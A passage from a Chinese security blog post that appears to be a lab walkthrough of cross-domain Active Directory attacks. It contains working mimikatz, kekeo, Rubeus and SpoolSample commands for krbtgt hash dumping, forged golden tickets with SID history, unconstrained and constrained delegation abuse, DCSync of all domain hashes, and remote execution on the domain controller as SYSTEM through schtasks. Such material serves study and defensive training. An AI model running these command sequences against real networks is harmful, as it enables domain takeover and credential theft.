+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">schtasks /create /s dc.hack.com /tn <span class="hljs-built_in">test</span> /sc onstart /tr c:\artifact.exe /ru system /f<br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/image-20231026114459649.png" srcset="/img/loading.gif" lazyload alt="image-20231026114459649"></p>
+<p>14.执行计划任务</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">schtasks <span class="hljs-regexp">/run /</span>s dc.hack.com <span class="hljs-regexp">/i /</span>tn <span class="hljs-string">&quot;test&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/image-20231026114535439.png" srcset="/img/loading.gif" lazyload alt="image-20231026114535439"> </p>
+<ol start="15">
+<li>dc上线：</li>
+</ol>
+<p><img src="/img/image-20231026114559758.png" srcset="/img/loading.gif" lazyload alt="image-20231026114559758"> </p>
+<h2 id="4-利用krbtgt值获取目标域"><a href="#4-利用krbtgt值获取目标域" class="headerlink" title="4.利用krbtgt值获取目标域"></a>4.利用krbtgt值获取目标域</h2><h3 id="实验环境-1"><a href="#实验环境-1" class="headerlink" title="实验环境"></a>实验环境</h3><table>
+<thead>
+<tr>
+<th>IP</th>
+<th>所属域</th>
+<th>域中地位</th>
+<th>机器名</th>
+<th>当前登录用户</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>10.210.100.10</td>
+<td>hack.com</td>
+<td>根域的域控</td>
+<td>DC</td>
+<td>hack\administrator</td>
+</tr>
+<tr>
+<td>10.210.100.150</td>
+<td>abc.hack.com</td>
+<td>子域域控</td>
+<td>DC2</td>
+<td>abc\administrator</td>
+</tr>
+<tr>
+<td>10.210.100.144</td>
+<td>abc.hack.com</td>
+<td>子域中的机器</td>
+<td>PC-2008-2</td>
+<td>abc\liwei</td>
+</tr>
+</tbody></table>
+<p>当前已经控制abc.hack.com域，其中包括 DC2机器和PC-2008-2机器</p>
+<h3 id="实验步骤-1"><a href="#实验步骤-1" class="headerlink" title="实验步骤"></a>实验步骤</h3><p>清除票据</p>
+<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs arduino">shell klist purge<br>mimikatz kerberos::purge<br></code></pre></td></tr></table></figure>
+
+<p>获取Krbtgt散列</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">lsadump::lsa <span class="hljs-regexp">/patch /u</span>ser:krbtgt<br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/image-20231026142607004.png" srcset="/img/loading.gif" lazyload alt="image-20231026142607004"> </p>
+<p>66664f8ca84afb2d6fa9947469140fc7</p>
+<p>获取关键信息</p>
+<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">lsadump::trust /patch<br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/image-20231026142645127.png" srcset="/img/loading.gif" lazyload alt="image-20231026142645127"> </p>
+<p>子域sid：S-1-5-21-3991110149-857536787-685120577</p>
+<p>父域sid：S-1-5-21-2431442348-1717482385-2017137259</p>
+<p>构造并注入黄金票据</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Kerberos</span>::golden /user:administrator /domain:当前域名 /sid:当前SID /sids:目标域SID-<span class="hljs-number">519</span> /krbtgt:krbtgt散列 /ptt<br><span class="hljs-attribute">Kerberos</span>::golden /user:administrator /domain:abc.hack.com /sid:S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">21</span>-<span class="hljs-number">3991110149</span>-<span class="hljs-number">857536787</span>-<span class="hljs-number">685120577</span> /sids:S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">21</span>-<span class="hljs-number">2431442348</span>-<span class="hljs-number">1717482385</span>-<span class="hljs-number">2017137259</span>-<span class="hljs-number">519</span> /krbtgt:<span class="hljs-number">66664</span>f8ca84afb2d6fa9947469140fc7 /ptt<br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/image-20231026143120911.png" srcset="/img/loading.gif" lazyload alt="image-20231026143120911"></p>
+<p>访问目标域</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">dir</span> \\dc.hack.com\c<span class="hljs-variable">$</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/image-20231026143132818.png" srcset="/img/loading.gif" lazyload alt="image-20231026143132818"> </p>
+<p>复制恶意文件</p>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">copy</span> <span class="hljs-number">1</span>.<span class="hljs-keyword">exe</span> \\dc.hack.<span class="hljs-keyword">com</span>\<span class="hljs-keyword">c</span>$<br></code></pre></td></tr></table></figure>
+
+<p>执行计划任务</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">schtasks /create /s dc.hack.com /tn <span class="hljs-built_in">test</span> /sc onstart /tr c:\1.exe /ru system /f<br></code></pre></td></tr></table></figure>
+
+<p>启动计划任务</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">schtasks <span class="hljs-regexp">/run /</span>s dc.hack.com <span class="hljs-regexp">/i /</span>tn <span class="hljs-string">&quot;test&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p>上线</p>
+<h2 id="5-委派攻击的概述"><a href="#5-委派攻击的概述" class="headerlink" title="5.委派攻击的概述"></a>5.委派攻击的概述</h2><h3 id="委派是什么"><a href="#委派是什么" class="headerlink" title="委派是什么"></a>委派是什么</h3><p>先看一下kerberos协议</p>
+<p><img src="/img/image-20231026143603868.png" srcset="/img/loading.gif" lazyload alt="image-20231026143603868"></p>
+<p>我们要去买票，但是自己又不想去，我们就可以委托中间商，给我们买票，这个就是委派</p>
+<p><img src="/img/image-20231026143634354.png" srcset="/img/loading.gif" lazyload alt="image-20231026143634354"></p>
+<p><strong>域委派是指将域内用户的权限委派给服务账户，使得服务账号能够以用户的权限在域内展开活动。</strong></p>
+<p>委派是域中的一种安全设置，可以允许某个机器上的服务代表某个用户去执行某个操作，主要分为三种：</p>
+<p>1、非约束性委派：不做任何限制，可以访问任何资源 例如 文件系统 oa系统  域控等</p>
+<p>2、约束性委派：限制访问某些指定的资源</p>
+<p>3、基于资源的约束性委派</p>
+<h3 id="委派攻击的工作场景"><a href="#委派攻击的工作场景" class="headerlink" title="委派攻击的工作场景"></a>委派攻击的工作场景</h3><p>一个域内用户访问WEB服务，但是一些资源在文件服务上，这个时候就需要委派</p>
+<p><img src="/img/image-20231026144321857.png" srcset="/img/loading.gif" lazyload alt="image-20231026144321857"></p>
+<h3 id="怎么设置委派"><a href="#怎么设置委派" class="headerlink" title="怎么设置委派"></a>怎么设置委派</h3><p>在域内只有<strong>主机账号</strong>（整个主机）和<strong>服务账号</strong>（例如主机上的web服务）才有委派属性</p>
+<p><strong>主机账号</strong>：活动目录中的computers组内的计算机，也被称为机器账号</p>
+<p><img src="/img/image-20231026145058584.png" srcset="/img/loading.gif" lazyload alt="image-20231026145058584"></p>
+<p><strong>服务账号</strong>：域内用户的一种类型，是服务器运行服务时所用的账号，将服务运行起来加入域内，比如：SQLServer,MYSQL等；域用户通过注册SPN也能成为服务账号。</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">net <span class="hljs-keyword">user</span> test123 <span class="hljs-keyword">Admin</span>@<span class="hljs-number">123</span> /<span class="hljs-keyword">add</span> /<span class="hljs-keyword">domain</span> 创建一个普通用户<br>setspn -U -A priv/test test123 注册为服务账号<br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/image-20231026145731798.png" srcset="/img/loading.gif" lazyload alt="image-20231026145731798"> </p>
+<p>开启委派如图</p>
+<p><img src="/img/image-20231026145744792.png" srcset="/img/loading.gif" lazyload alt="image-20231026145744792"></p>
+<h2 id="6-非约束委派攻击"><a href="#6-非约束委派攻击" class="headerlink" title="6.非约束委派攻击"></a>6.非约束委派攻击</h2><h3 id="非约束委派使用场景"><a href="#非约束委派使用场景" class="headerlink" title="非约束委派使用场景"></a>非约束委派使用场景</h3><p>从使用的角度：用户张三访问一台机器A，于是向KDC发起认证，KDC会检查A的机器账号的属性，如果是非约束委派的话，会把用户的TGT放在ST票据中并一起发送给A,这样A在验证ST票据的同时也获取到了用户的TGT，并把TGT储存在自己的lsass进程中以备下次重用，从而A就可以使用这个TGT，来模拟这个张三访问任何服务。</p>
+<p><img src="/img/image-20231026150551796.png" srcset="/img/loading.gif" lazyload alt="image-20231026150551796"></p>
+<p>从攻击角度来说：如果攻击者拿到了一台配置了非约束委派的机器权限，可以诱导管理员来访问该机器，然后可以得到管理员的TGT，从而模拟管理员访问任意服务，相当于拿下了整个域环境，或者结合打印机漏洞让域管用户强制回连以缓存TGT</p>
+<p>一个域内用户访问WEB服务，但是一些资源在文件服务上，这个时候就需要委派，需要web系统代表用户A去访问文件服务的资源</p>
+<p><img src="/img/image-20231026150752355.png" srcset="/img/loading.gif" lazyload alt="image-20231026150752355"></p>
+<h3 id="非约束委派的漏洞"><a href="#非约束委派的漏洞" class="headerlink" title="非约束委派的漏洞"></a>非约束委派的漏洞</h3><p><img src="/img/image-20231026151227151.png" srcset="/img/loading.gif" lazyload alt="image-20231026151227151"></p>
+<p>如果是域管访问web系统，我们就可以通过web系统伪造域管的身份登录域控</p>
+<h3 id="利用非约束委派域控主动访问控制域"><a href="#利用非约束委派域控主动访问控制域" class="headerlink" title="利用非约束委派域控主动访问控制域"></a>利用非约束委派域控主动访问控制域</h3><p>实验环境</p>
+<table>
+<thead>
+<tr>
+<th>机器位置</th>
+<th>IP</th>
+<th>机器名</th>
+<th>机器登录用户</th>
+<th>所属域</th>
+<th>委派配置</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>域控</td>
+<td>10.210.100.10</td>
+<td>DC</td>
+<td>hack\administrator</td>
+<td>hack.com</td>
+<td>域控</td>
+</tr>
+<tr>
+<td>域内机器</td>
+<td>10.210.100.40</td>
+<td>PC-WEB</td>
+<td>hack\r1cky</td>
+<td>hack.com</td>
+<td>配置了非约束委派</td>
+</tr>
+</tbody></table>
+<p>实验前提：控制了域内的一台机器pc-web，并且该机器的服务账号配置了非约束委派，如下： </p>
+<p><img src="/img/image-20231026154603409.png" srcset="/img/loading.gif" lazyload alt="image-20231026154603409"> </p>
+<p>1、使用Adfind查询域内非约束委派机器账号</p>
+<figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">AdFind.exe</span> -<span class="hljs-keyword">b</span> <span class="hljs-string">&quot;DC=hack,DC=com&quot;</span> -f <span class="hljs-string">&quot;(&amp;(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot;</span> <span class="hljs-meta">cn</span> distinguishedName<br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/image-20231026154958716.png" srcset="/img/loading.gif" lazyload alt="image-20231026154958716"></p>
+<p>查询具有委派的服务账号</p>
+<figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">AdFind.exe</span> -<span class="hljs-keyword">b</span> <span class="hljs-string">&quot;DC=hack,DC=com&quot;</span> -f <span class="hljs-string">&quot;(&amp;(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot;</span> -<span class="hljs-meta">dn</span><br></code></pre></td></tr></table></figure>
+
+<p>2、我们先去访问域控，是不能访问的</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">dir</span> \\dc.hack.com\c<span class="hljs-variable">$</span><br></code></pre></td></tr></table></figure>
+
+
+
+<p>3、这个时候如果<strong>域管访问了pc-web机器</strong>我们的内存中就会有域管的TGT，就可以访问任意机器了，在与域控上执行访问PC-WEB(在域控上执行)</p>
+<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir">net <span class="hljs-keyword">use</span> \\<span class="hljs-title class_">PC</span>-<span class="hljs-title class_">WEB</span>.<span class="hljs-title class_">HACK</span>.<span class="hljs-title class_">COM</span> /<span class="hljs-symbol">user:</span>hack\administrator <span class="hljs-title class_">Admin</span><span class="hljs-variable">@123</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/image-20231026155119975.png" srcset="/img/loading.gif" lazyload alt="image-20231026155119975"> </p>
+<p>4、去pc-web导出内存中的票据</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp">sekurlsa::tickets /<span class="hljs-keyword">export</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/image-20231026155241351.png" srcset="/img/loading.gif" lazyload alt="image-20231026155241351"> </p>
+<p>导出失败  需要提权</p>
+<p><img src="/img/image-20231026155300222.png" srcset="/img/loading.gif" lazyload alt="image-20231026155300222"> </p>
+<p><img src="/img/image-20231026155537670.png" srcset="/img/loading.gif" lazyload alt="image-20231026155537670"> </p>
+<p>5、进行票据传递就可以获取域控的权限了</p>
+<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dns">mimikatz kerberos<span class="hljs-number">::</span>ptt [<span class="hljs-number">0;9c453</span>]-<span class="hljs-number">2</span>-<span class="hljs-number">0-60a10000</span>-Administrator@krbtgt-HACK.COM.kirbi<br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/image-20231026155706178.png" srcset="/img/loading.gif" lazyload alt="image-20231026155706178"></p>
+<p>6、访问域控</p>
+<p><img src="/img/image-20231026155724917.png" srcset="/img/loading.gif" lazyload alt="image-20231026155724917"> </p>
+<p>7、使用计划任务，服务，或者无文件的powershell上线</p>
+<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">shell</span><span class="language-bash"> copy artifact.exe \\dc.hack.com\C$</span><br><span class="hljs-keyword">shell</span><span class="language-bash"> schtasks /create /s dc.hack.com /tn <span class="hljs-built_in">test</span> /sc onstart /tr c:\artifact.exe /ru</span><br>system /f<br><span class="hljs-keyword">shell</span><span class="language-bash"> schtasks /run /s dc.hack.com /i /tn <span class="hljs-string">&quot;test&quot;</span></span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/image-20231026155917312.png" srcset="/img/loading.gif" lazyload alt="image-20231026155917312"> </p>
+<h3 id="利用非约束委派域控被动访问控制域控"><a href="#利用非约束委派域控被动访问控制域控" class="headerlink" title="利用非约束委派域控被动访问控制域控"></a>利用非约束委派域控被动访问控制域控</h3><table>
+<thead>
+<tr>
+<th>机器位置</th>
+<th>IP</th>
+<th>机器名</th>
+<th>机器登录用户</th>
+<th>所属域</th>
+<th>委派配置</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>域控</td>
+<td>10.210.100.10</td>
+<td>DC</td>
+<td>hack\administrator</td>
+<td>hack.com</td>
+<td>域控</td>
+</tr>
+<tr>
+<td>域内机器</td>
+<td>10.210.100.40</td>
+<td>2012-2(OA)</td>
+<td>administrator</td>
+<td>hack.com</td>
+<td>配置了非约束委派</td>
+</tr>
+</tbody></table>
+<p>实验前提：控制了域内的一台机器OA，并且该机器的服务账号配置了非约束委派，如下：</p>
+<p>一般域管不会主动访问我们，我们可以利用 Windows 打印系统远程协议（MS-RPRN）中的一种旧的但是默认启用的方法，在该方法中，域用户可以使用 MS-RPRN RpcRemoteFindFirstPrinterChangeNotification(Ex) 方法强制任何运行了 Spooler 服务的计算机以通过 Kerberos 或 NTLM 对攻击者选择的目标进行身份验证。</p>
+<p>非约束性委派主机结合 Spooler 打印机服务漏洞，<strong>让域控机器DC强制访问已控的具有本地管理员权限的非约束性委派机器</strong> OA ，从而拿到域管理员的 TGT，进而接管域控。（2008机器可能复现不了，因为版本的问题）</p>
+<p>进行实验之前一定要把所有的防火墙关闭</p>
+<p>1、首先利用Rubeus在 OA 上以本地管理员权限执行以下命令，每隔一秒监听来自域控机器DC的登录信息</p>
+<figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs smali">Rubeus.exe<span class="hljs-built_in"> monitor </span>/interval:1 /filteruser:DC$<br></code></pre></td></tr></table></figure>
+
+<p>这里执行失败（下面为他人成功示例）</p>
+<p><img src="/img/image-20231026162055410.png" srcset="/img/loading.gif" lazyload alt="image-20231026162055410"> </p>
+<p><img src="/img/image-20231026162115838.png" srcset="/img/loading.gif" lazyload alt="image-20231026162115838"></p>
+<p>再利用SpoolSample强制域控打印机回连，需在域用户进程上执行，所以这里切换成了普通域用户帐号去执行</p>
+<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">SpoolSample</span>.</span></span>exe DC OA<br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/image-20231026162234292.png" srcset="/img/loading.gif" lazyload alt="image-20231026162234292"></p>
+<p>Rubeus监听到票据</p>
+<p><img src="/img/image-20231026162243719.png" srcset="/img/loading.gif" lazyload alt="image-20231026162243719"></p>
+<p>Rubeus导入票据</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">Rubeus.exe ptt /ticket:票据<br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/image-20231026162307198.png" srcset="/img/loading.gif" lazyload alt="image-20231026162307198"></p>
+<p>获取域内用户的hash</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">lsadump::dcsync <span class="hljs-regexp">/all /</span>csv<br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/image-20231026162327496.png" srcset="/img/loading.gif" lazyload alt="image-20231026162327496"></p>
+<p>如果当前的用户是管理员就可以使用PTH攻击，如果是普通的域用户就使用黄金票据</p>
+<p><img src="/img/image-20231026162338329.png" srcset="/img/loading.gif" lazyload alt="image-20231026162338329"></p>
+<p>使用计划任务，服务，或者无文件的powershell上线</p>
+<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">copy</span><span class="language-bash"> 123.exe \\dc.hack.com\C$</span><br><span class="hljs-keyword">shell</span><span class="language-bash"> schtasks /create /s dc.hack.com /tn <span class="hljs-built_in">test</span> /sc onstart /tr c:\123.exe /ru</span><br>system /f<br><span class="hljs-keyword">shell</span><span class="language-bash"> schtasks /run /s dc.hack.com /i /tn <span class="hljs-string">&quot;test&quot;</span></span><br></code></pre></td></tr></table></figure>
+
+
+
+<h2 id="7-约束性委派攻击"><a href="#7-约束性委派攻击" class="headerlink" title="7.约束性委派攻击"></a>7.约束性委派攻击</h2><h3 id="约束性委派场景"><a href="#约束性委派场景" class="headerlink" title="约束性委派场景"></a>约束性委派场景</h3><p>当这个用户不在域内，他在出差，不能使用kerberos去认证，只能使用其他协议认证web系统，那同样WEB系统也需要访问文件服务的资源，这个时候如何认证呢？</p>
+<p><img src="/img/image-20231026165118008.png" srcset="/img/loading.gif" lazyload alt="image-20231026165118008"></p>
+<p>Widnows Server2003之后微软引入了非约束委派。由于非约束委派的不安全性或者场景受限（配置了非约束委派的机器在 LSASS 中缓存了用户的TGT票据可模拟用户去访问域中任意服务），微软于2007年为 Kerberos 协议进行扩展引入S4U(service for user)协议，该协议分为两个子协议</p>
+<p>这两个扩展都允许服务代表用户从KDC请求票证。</p>
+<p>约束委派限制了S4U2proxy协议的请求范围，使得<strong>配置了委派属性的服务只能模拟用户身份访问特定的其他服务</strong></p>
+<p>1、S4u2self（Service for User to Self） </p>
+<p>2、S4U2proxy（Service for User to Proxy）</p>
+<p>这两个扩展都允许服务代表用户从KDC请求票证</p>
+<p>约束委派限制了S4U2proxy协议的请求范围，使得配置了委派属性的服务只能模拟用户身份访问特定的其他服务</p>
+<p><img src="/img/image-20231026165502523.png" srcset="/img/loading.gif" lazyload alt="image-20231026165502523"></p>
+<p>存在的问题</p>
+<p>1、服务账号B可以代表A申请访问B的票据，那么可不可以代表域管申请域管访问B的票据呢？在这个过程中，不需要域管参与，服务B自身就可以完成 </p>
+<p>2、服务账号B可以代表A申请访问C的票据，那么可不可以代表域管申请域管访问C的票据呢？在这个过程中，不需要域管参与，服务B自身就可以完成</p>
+<h3 id="约束性委派攻击流程"><a href="#约束性委派攻击流程" class="headerlink" title="约束性委派攻击流程"></a>约束性委派攻击流程</h3><p>用户（A）访问WEB系统（B）,B代表A去向KDC申请访问B的TGT和ST1(使用S4u2self),用户A拿到了ST1就可以访问B了，如果在B上配置了约束性委派（A到C的约束委派），则B能够使用S4U2Proxy协议将用 户发给自己的可转发的ST1票据以用户的身份发给KDC,KDC返回B一个访问C的票据ST2，这样B就可以以用户的身份访问C</p>
+<p><img src="/img/image-20231026173140970.png" srcset="/img/loading.gif" lazyload alt="image-20231026173140970"></p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-number">1</span>.通过NTLM或者其他认证<br><span class="hljs-number">2</span><span class="hljs-selector-class">.B</span>代表<span class="hljs-selector-tag">A</span>申请<span class="hljs-selector-tag">A</span>访问<span class="hljs-selector-tag">B</span>的票据(TGT和ST1)<br><span class="hljs-number">3</span><span class="hljs-selector-class">.KDC</span>返回用户的TGT和ST1票据给<span class="hljs-selector-tag">B</span><br><span class="hljs-number">4</span><span class="hljs-selector-class">.B</span>把ST1票据给<span class="hljs-selector-tag">A</span><br><span class="hljs-number">5</span><span class="hljs-selector-class">.A</span>用ST1去访问<span class="hljs-selector-tag">B</span><br><span class="hljs-number">6</span><span class="hljs-selector-class">.B</span>拿着<span class="hljs-selector-tag">A</span>的ST1作为证据，去申请访问C的ST2<br><span class="hljs-number">7</span><span class="hljs-selector-class">.B</span>用ST2票据访问C<br></code></pre></td></tr></table></figure>
+
+<p>存在的问题是什么呢？ </p>
+<p>B会获取A的TGT,只要能伪造A的TGT,就可以用TGT申请ST1票据（伪造管理员申请ST1票据）</p>
+<h3 id="实验场景"><a href="#实验场景" class="headerlink" title="实验场景"></a>实验场景</h3><p><img src="/img/image-20231026173807878.png" srcset="/img/loading.gif" lazyload alt="image-20231026173807878"></p>
+<p>实验前提：我们已经控制了ZS的电脑，发现该电脑配置了约束性的委派，并且可以读取到该电脑的机器用户的HASH值</p>
+<p>1、查询约束性委派的机器和用户</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stylus">查询约束委派机器账户<br>AdFind<span class="hljs-selector-class">.exe</span> -<span class="hljs-selector-tag">b</span> <span class="hljs-string">&quot;DC=hack,DC=com&quot;</span> -f <span class="hljs-string">&quot;(&amp;(samAccountType=805306369)(msds-allowedtodelegateto=*))&quot;</span> msds-allowedtodelegateto<br>查询约束委派服务账户<br>AdFind<span class="hljs-selector-class">.exe</span> -<span class="hljs-selector-tag">b</span> <span class="hljs-string">&quot;DC=hack,DC=com&quot;</span> -f <span class="hljs-string">&quot;(&amp;(samAccountType=805306368)(msds-allowedtodelegateto=*))&quot;</span> cn distinguishedName msds-allowedtodelegateto<br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/image-20231026173852063.png" srcset="/img/loading.gif" lazyload alt="image-20231026173852063"></p>
+<p>查询到PC-ZS电脑配置了约束委派，委派的目标是DC的CIFS服务 </p>
+<p>2、使用mimikatz获取机器账户NTLM Hash</p>
+<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">mimikatz sekurlsa::logonpasswords<br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/image-20231026173915464.png" srcset="/img/loading.gif" lazyload alt="image-20231026173915464"></p>
+<p>3、使用kekeo申请配置了约束委派机器账户PC-ZS$的TGT</p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">kekeo</span> <span class="hljs-string">&quot;tgt::ask /user:PC-ZS$ /NTLM:bd41aace231471169d848817a2c46178 /domain:hack.com&quot;</span> <span class="hljs-string">&quot;exit&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/image-20231026173937509.png" srcset="/img/loading.gif" lazyload alt="image-20231026173937509"></p>
+<p>利用TGT通过伪造S4U请求以administrator身份访问PC-ZS的ST</p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">kekeo</span> <span class="hljs-string">&quot;tgs::s4u /tgt:TGT_PC-ZS$<span class="hljs-variable">@HACK</span>.COM_krbtgt~hack.com<span class="hljs-variable">@HACK</span>.COM.kirbi /user:Administrator<span class="hljs-variable">@hack</span>.com /service:cifs/dc.hack.com&quot;</span> <span class="hljs-string">&quot;exit&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/image-20231026174002747.png" srcset="/img/loading.gif" lazyload alt="image-20231026174002747"></p>
+<p>mimkatz注入</p>
+<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs elixir">mimikatz kerberos::ptt<br><span class="hljs-title class_">TGS_Administrator</span><span class="hljs-variable">@hack</span>.com<span class="hljs-variable">@HACK</span>.<span class="hljs-title class_">COM_cifs</span>~dc.hack.com<span class="hljs-variable">@HACK</span>.<span class="hljs-title class_">COM</span>.kirbi<br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/image-20231026174025033.png" srcset="/img/loading.gif" lazyload alt="image-20231026174025033"></p>
+<p>访问域控</p>
+<p><img src="/img/image-20231026174037119.png" srcset="/img/loading.gif" lazyload alt="image-20231026174037119"></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E5%90%8E%E6%B8%97%E9%80%8F/" class="category-chain-item">后渗透</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>内网-跨域攻击</div>
+      <div>http://example.com/2023/11/03/内网-跨域攻击/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>r1</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年11月3日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/11/03/%E5%86%85%E7%BD%91-%E5%9F%9F%E6%8E%A7%E5%AE%89%E5%85%A8/" title="内网-域控安全">
+                        <span class="hidden-mobile">内网-域控安全</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
